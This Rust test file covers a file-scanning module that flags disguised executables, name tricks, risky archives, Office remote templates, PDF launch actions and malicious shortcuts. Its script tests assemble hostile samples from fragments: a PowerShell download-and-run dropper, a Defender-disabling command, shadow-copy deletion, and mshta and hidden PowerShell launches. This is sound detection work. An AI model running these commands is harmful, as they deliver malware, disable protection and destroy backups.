//! Tests for sniff.rs. Inputs are built in memory; the dropper-like lines are glued together
//! from pieces at run time, so no file (source or test binary) holds a whole one for Defender
//! to catch. Every case has a CLEAN twin that must stay quiet: a check that only ever fires
//! proves nothing.

use super::sniff::*;
use super::*;
use std::io::Write;

fn codes(v: &Value) -> Vec<String> {
    v["flags"].as_array().unwrap().iter().map(|f| f["code"].as_str().unwrap().to_string()).collect()
}
fn level(v: &Value, code: &str) -> String {
    v["flags"].as_array().unwrap().iter().find(|f| f["code"] == code).map(|f| f["level"].as_str().unwrap().to_string()).unwrap_or_default()
}
fn zip_of(files: &[(&str, &[u8])], password: bool) -> Vec<u8> {
    let mut w = zip::ZipWriter::new(std::io::Cursor::new(Vec::new()));
    for (n, b) in files {
        w.start_file(*n, zip::write::SimpleFileOptions::default()).unwrap();
        w.write_all(b).unwrap();
    }
    let mut z = w.finish().unwrap().into_inner();
    if password {
        // The crate won't write a locked zip, so set the "encrypted" bit (general-purpose flag
        // bit 0) in every local and central header - what a real password-protected zip carries.
        let mut i = 0;
        while i + 4 <= z.len() {
            match &z[i..i + 4] {
                b"PK\x03\x04" => z[i + 6] |= 1,
                b"PK\x01\x02" => z[i + 8] |= 1,
                _ => {}
            }
            i += 1;
        }
    }
    z
}
fn j(parts: &[&str]) -> String { parts.concat() }

#[test]
fn disguised_program_and_name_tricks() {
    let pe = b"MZ\x90\x00 rest of a program";
    let v = sniff_bytes("invoice.pdf", "pdf", pe);
    assert_eq!(v["kind"], "program");
    assert_eq!(level(&v, "disguised-program"), "danger", "{v}");
    let v = sniff_bytes("setup.exe", "exe", pe);
    assert!(!codes(&v).contains(&"disguised-program".to_string()), "an honest .exe is not disguised: {v}");
    assert_eq!(level(&v, "can-run"), "info");

    assert_eq!(level(&sniff_bytes("bill.pdf.exe", "exe", pe), "double-ending"), "danger");
    assert!(!codes(&sniff_bytes("my.app.v2.exe", "exe", pe)).contains(&"double-ending".to_string()), "version dots are not a trick");
    assert_eq!(level(&sniff_bytes("photo\u{202E}gpj.exe", "exe", pe), "name-reversed"), "danger");
    assert_eq!(level(&sniff_bytes("report.pdf          .exe", "exe", pe), "hidden-ending"), "danger");

    let lnk = b"L\x00\x00\x00\x01\x14\x02\x00\x00\x00";
    assert_eq!(level(&sniff_bytes("cv.docx", "docx", lnk), "disguised-shortcut"), "danger");
}

#[test]
fn archives() {
    let v = sniff_bytes("photos.zip", "zip", &zip_of(&[("a.jpg", b"x"), ("b.jpg", b"y")], false));
    assert!(codes(&v).is_empty(), "plain photo zip must be quiet: {v}");

    let v = sniff_bytes("photos.zip", "zip", &zip_of(&[("IMG_2201.jpg.js", b"x")], false));
    assert_eq!(level(&v, "archive-has-program"), "careful");
    assert_eq!(level(&v, "archive-name-trick"), "danger", "{v}");
    assert_eq!(level(&v, "archive-single-program"), "danger", "{v}");

    let v = sniff_bytes("docs.zip", "zip", &zip_of(&[("a.pdf", b"x")], true));
    assert_eq!(level(&v, "locked-archive"), "careful", "{v}");

    let v = sniff_bytes("scan.pdf", "pdf", &zip_of(&[("a.txt", b"x")], false));
    assert_eq!(level(&v, "disguised-archive"), "careful", "a zip named .pdf: {v}");
}

#[test]
fn office_macros_and_remote_template() {
    let plain = zip_of(&[("word/document.xml", b"<w/>"), ("[Content_Types].xml", b"<x/>")], false);
    assert!(codes(&sniff_bytes("a.docx", "docx", &plain)).is_empty(), "clean docx must be quiet");

    let mac = zip_of(&[("word/document.xml", b"<w/>"), ("word/vbaProject.bin", b"\x00")], false);
    assert_eq!(level(&sniff_bytes("a.docm", "docm", &mac), "macros"), "careful");

    let tmpl = j(&[r#"<Relationships><Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/attachedTemplate" "#,
        r#"Target="http://198.51.100.7/t.dotm" TargetMode="External"/></Relationships>"#]);
    let v = sniff_bytes("a.docx", "docx", &zip_of(&[("word/document.xml", b"<w/>"), ("word/_rels/settings.xml.rels", tmpl.as_bytes())], false));
    assert_eq!(level(&v, "remote-template"), "danger", "{v}");
    // An ordinary web link inside a document is also External - it must NOT count.
    let link = r#"<Relationships><Relationship Id="rId9" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/hyperlink" Target="https://example.org/" TargetMode="External"/></Relationships>"#;
    let v = sniff_bytes("a.docx", "docx", &zip_of(&[("word/document.xml", b"<w/>"), ("word/_rels/document.xml.rels", link.as_bytes())], false));
    assert!(codes(&v).is_empty(), "a hyperlink is not a remote template: {v}");

    let mut ole = b"\xD0\xCF\x11\xE0\xA1\xB1\x1A\xE1".to_vec();
    ole.extend(std::iter::repeat(0u8).take(600));
    assert!(codes(&sniff_bytes("old.doc", "doc", &ole)).is_empty(), "clean OLE quiet");
    ole.extend("_VBA_PROJECT".encode_utf16().flat_map(|u| u.to_le_bytes()));
    assert_eq!(level(&sniff_bytes("old.doc", "doc", &ole), "macros"), "careful");
}

#[test]
fn pdfs() {
    let clean = b"%PDF-1.7\n1 0 obj << /Type /Catalog /Pages 2 0 R >> endobj\n/JSON is not code\n%%EOF";
    assert!(codes(&sniff_bytes("a.pdf", "pdf", clean)).is_empty(), "clean pdf quiet: {}", sniff_bytes("a.pdf", "pdf", clean));
    let js = b"%PDF-1.7\n1 0 obj << /Names << /JavaScript 3 0 R >> >> endobj\n%%EOF";
    assert_eq!(level(&sniff_bytes("a.pdf", "pdf", js), "pdf-code"), "careful");
    // Only the escaped spelling is present, so this passes only if "#61" is decoded.
    let auto = b"%PDF-1.7\n1 0 obj << /OpenAction << /S /J#61vaScript >> >> endobj";
    assert_eq!(level(&sniff_bytes("a.pdf", "pdf", auto), "pdf-code"), "danger", "#61 escape must be undone");
    let launch = b"%PDF-1.4\n<< /S /Launch /F (cmd) >>";
    assert_eq!(level(&sniff_bytes("a.pdf", "pdf", launch), "pdf-launch"), "danger");
}

// ---- 29 Sep evening: his laptop sweep called 44 ordinary files harmful. Each case has its twin
// that must still be caught.

#[test]
fn a_program_with_an_odd_name_is_a_note_but_dressed_as_a_document_is_harmful() {
    let pe = b"MZ\x90\x00 rest of a program";
    for (name, ext) in [("7163.tmp", "tmp"), ("_6236drkvdk.psdsxs", "psdsxs")] {
        let v = sniff_bytes(name, ext, pe);
        assert!(!codes(&v).contains(&"disguised-program".to_string()), "{name}: {v}");
        assert_eq!(level(&v, "program-odd-name"), "careful", "{name}: {v}");
    }
    for (name, ext) in [("holiday.jpg", "jpg"), ("Salary.xlsx", "xlsx"), ("clip.mp4", "mp4"), ("README", "")] {
        assert_eq!(level(&sniff_bytes(name, ext, pe), "disguised-program"), "danger", "{name}");
    }
}

#[test]
fn a_template_on_the_authors_own_drive_is_not_fetched_one_on_another_machine_is() {
    let rels = |target: &str| {
        let x = j(&[r#"<Relationships><Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/attachedTemplate" "#,
            &format!(r#"Target="{target}" TargetMode="External"/></Relationships>"#)]);
        sniff_bytes("a.docx", "docx", &zip_of(&[("word/document.xml", b"<w/>"), ("word/_rels/settings.xml.rels", x.as_bytes())], false))
    };
    for local in [r"file:///C:\Users\sethf\AppData\Roaming\Microsoft\Word\STARTUP\Building%20Block.dotx", "file:///d:/t/n.dotm", "file:///C|/t.dotm"] {
        assert!(!codes(&rels(local)).contains(&"remote-template".to_string()), "{local}");
    }
    for far in ["file://198.51.100.7/share/t.dotm", "file:///\\\\198.51.100.7\\s\\t.dotm", "https://198.51.100.7/t.dotm"] {
        assert_eq!(level(&rels(far), "remote-template"), "danger", "{far}");
    }
}

#[test]
fn a_pdf_launching_a_program_is_harmful_one_opening_a_document_is_a_note() {
    let pdf = |body: &str| sniff_bytes("r.pdf", "pdf", format!("%PDF-1.6\n{body}\n%%EOF").as_bytes());
    // NCRB / NFHS shape: the Launch points (by reference) at a Filespec naming another PDF or a mail address.
    for body in ["1 0 obj <</F 2 0 R/S/Launch>> endobj 2 0 obj <</F(/F/WEB-CII-2016-N/pdfs/Table 3.4.pdf)/Type/Filespec>> endobj",
                 "1 0 obj <</F 2 0 R/S/Launch>> endobj 2 0 obj <</F(survey.desk@example.ac.in)/Type/Filespec>> endobj",
                 // The one that stayed wrong on his laptop: a gmail address ends in ".com".
                 "1 0 obj <</F 2 0 R/S/Launch>> endobj 2 0 obj <</F(survey.desk@example.com)/Type/Filespec>> endobj 3 0 obj <</F(mailto:a@example.com)>> endobj"] {
        let v = pdf(body);
        assert!(!codes(&v).contains(&"pdf-launch".to_string()), "{v}");
        assert_eq!(level(&v, "pdf-opens-file"), "careful", "{v}");
    }
    for body in ["<< /S /Launch /Win << /F (C:\\\\Windows\\\\System32\\\\cmd.exe) /P (/c calc) >> >>",
                 "<< /S /Launch /F (invoice.pdf) >> << /S /Launch /F (payload.hta) >>",
                 "<< /S /Launch /F <706f7765727368656c6c> >>",
                 "<< /S /Launch /F (C:\\\\Users\\\\a@b\\\\run.com) >>",
                 "1 0 obj <</F 2 0 R/S/Launch>> endobj"] {
        assert_eq!(level(&pdf(body), "pdf-launch"), "danger", "{body}");
    }
}

#[test]
fn shortcuts() {
    let mut lnk = b"L\x00\x00\x00\x01\x14\x02\x00".to_vec();
    lnk.extend(std::iter::repeat(0u8).take(70));
    let mut clean = lnk.clone();
    clean.extend("C:\\Windows\\notepad.exe".encode_utf16().flat_map(|u| u.to_le_bytes()));
    assert!(codes(&sniff_bytes("n.lnk", "lnk", &clean)).iter().all(|c| c == "can-run"), "notepad shortcut quiet");
    let mut bad = lnk.clone();
    bad.push(0); // odd offset: the reader must still find it
    bad.extend(j(&["C:\\Windows\\System32\\Windows", "PowerShell\\v1.0\\power", "shell.exe -w hidden"]).encode_utf16().flat_map(|u| u.to_le_bytes()));
    assert_eq!(level(&sniff_bytes("Invoice.lnk", "lnk", &bad), "shortcut-runs-command"), "danger");
}

#[test]
fn scripts() {
    let clean = "@echo off\r\necho Backing up\r\nxcopy C:\\data D:\\backup /e\r\n";
    assert!(codes(&sniff_bytes("backup.bat", "bat", clean.as_bytes())).iter().all(|c| c == "can-run"), "plain batch quiet");

    let dropper = j(&["$w = New-Object Net.Web", "Client; I", "EX ($w.Download", "String('http://198.51.100.7/a'))"]);
    let v = sniff_bytes("update.ps1", "ps1", dropper.as_bytes());
    assert_eq!(level(&v, "download-and-run"), "danger", "{v}");

    let off = j(&["Set-Mp", "Preference -Disable", "RealtimeMonitoring $true"]);
    assert_eq!(level(&sniff_bytes("fix.ps1", "ps1", off.as_bytes()), "turns-off-defender"), "danger");
    let shadows = j(&["vss", "admin delete sha", "dows /all /quiet"]);
    assert_eq!(level(&sniff_bytes("x.cmd", "cmd", shadows.as_bytes()), "deletes-backups"), "danger");
    let hidden = format!("{}{}", j(&["power", "shell -w hidden -e"]), format!(" {}", "QQ".repeat(40)));
    let v = sniff_bytes("run.bat", "bat", hidden.as_bytes());
    assert_eq!(level(&v, "hidden-code"), "careful", "{v}");
    assert_eq!(level(&v, "hidden-and-run"), "danger", "{v}");
    let mshta = j(&["msh", "ta https://198.51.100.7/p.hta"]);
    assert_eq!(level(&sniff_bytes("go.cmd", "cmd", mshta.as_bytes()), "web-runner"), "danger");

    // UTF-16 scripts are read too.
    let wide: Vec<u8> = [0xFFu8, 0xFE].into_iter().chain(off.encode_utf16().flat_map(|u| u.to_le_bytes())).collect();
    assert_eq!(level(&sniff_bytes("fix.ps1", "ps1", &wide), "turns-off-defender"), "danger");

    // An HTML file dressed as a picture.
    let v = sniff_bytes("photo.jpg", "jpg", b"<html><script>location='http://x'</script></html>");
    assert_eq!(level(&v, "disguised-script"), "danger", "{v}");
    // A real picture stays quiet.
    assert!(codes(&sniff_bytes("photo.jpg", "jpg", b"\xFF\xD8\xFF\xE0 jpeg data")).is_empty());
}

#[test]
#[cfg(windows)]
fn downloaded_from_and_signature() {
    let dir = super::testdir::TestDir::new("sniff");
    let f = dir.join("got.txt");
    std::fs::write(&f, b"hello").unwrap();
    assert_eq!(downloaded_from(&f)["marked"], false, "no mark yet");
    std::fs::write(format!("{}:Zone.Identifier", f.display()), "[ZoneTransfer]\r\nZoneId=3\r\nHostUrl=https://example.org/got.txt\r\n").unwrap();
    let o = downloaded_from(&f);
    assert_eq!(o["zone"], 3, "{o}");
    assert_eq!(o["host"], "https://example.org/got.txt");

    // Known-good and known-bad for the signature reader.
    let np = PathBuf::from(r"C:\Windows\System32\notepad.exe");
    let s = signature(&np);
    assert_eq!(s["status"], "Valid", "notepad is signed: {s}");
    assert!(s["signer"].as_str().unwrap_or("").contains("Microsoft"), "{s}");
    let fake = dir.join("fake.exe");
    std::fs::write(&fake, b"MZ not really a program").unwrap();
    let s = signature(&fake);
    assert_ne!(s["status"], "Valid", "an unsigned file must not read as signed: {s}");
    let _ = std::fs::remove_dir_all(&dir);
}

/// The "what I checked" list names only checks that really ran on this file, with real counts.
#[test]
fn checked_lists_what_ran() {
    let ck = |v: &Value| -> Vec<String> { v["checked"].as_array().unwrap().iter().map(|c| c["code"].as_str().unwrap().to_string()).collect() };
    let pdf = sniff_bytes("a.pdf", "pdf", b"%PDF-1.7\n1 0 obj << >> endobj\n");
    assert_eq!(ck(&pdf), ["type", "name", "pdf"]);
    let txt = sniff_bytes("n.txt", "txt", b"hello\nworld\n");
    assert_eq!(ck(&txt), ["type", "name", "script"]);
    assert_eq!(txt["checked"][2]["lines"], 2);
    let z = zip_of(&[("a.txt", b"x"), ("b.txt", b"y"), ("c.txt", b"z")], false);
    let zv = sniff_bytes("f.zip", "zip", &z);
    assert_eq!(ck(&zv), ["type", "name", "zip-archive"]);
    assert_eq!(zv["checked"][2]["n"], 3);
    let pic = sniff_bytes("p.png", "png", b"\x89PNG\r\n\x1a\n0000");
    assert_eq!(ck(&pic), ["type", "name"]);
}
